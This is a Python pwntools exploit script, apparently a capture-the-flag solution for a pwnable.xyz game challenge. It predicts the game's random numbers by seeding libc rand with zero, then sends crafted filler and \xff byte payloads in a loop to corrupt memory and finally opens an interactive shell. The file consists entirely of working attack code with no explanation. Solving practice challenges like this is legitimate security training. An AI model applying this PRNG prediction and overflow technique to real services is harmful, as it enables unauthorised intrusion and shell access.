from pwn import *
from ctypes import *

lib = CDLL('/lib/x86_64-linux-gnu/libc.so.6')


score = 0
def add_score():
    sh.recvuntil('score: ')

    score = int(sh.recvline().strip())

    print "score = ", score
    rand = lib.rand()

    sh.sendlineafter('> ', str(0xffffffff))
    return score + 1


def draw(length):
    sh.recvuntil('score: ')

    score = int(sh.recvline().strip())

    print "score = ", score

    rand = lib.rand()

    sh.sendlineafter('> ', str(rand))
    sh.sendafter('Save? [N/y]', 'y')
    name = "\xff"*length
    sh.sendafter(':', name)

def lose():
    sh.recvuntil('score: ')
    score = int(sh.recvline().strip())
    print "score = ", score
    rand = lib.rand()
    sh.sendlineafter('> ', str(0))



    




debug = 0
if not debug:
    sh = remote('svc.pwnable.xyz', 30024)
else:
    sh = process('./challenge')
sh.sendlineafter(': ', 'y')
name = "A"*0x2c
sh.sendafter(': ', name)
sh.sendafter('> ', '0')
lib.srand(0)






add_score()
draw(45)
for i in range(0, 127):

    s = 0
    add_score()
    temp = add_score()
    while (temp % 2 != 0):
        temp = temp >> 8
        s += 1
    draw(44+s)

lose()
sh.interactive()
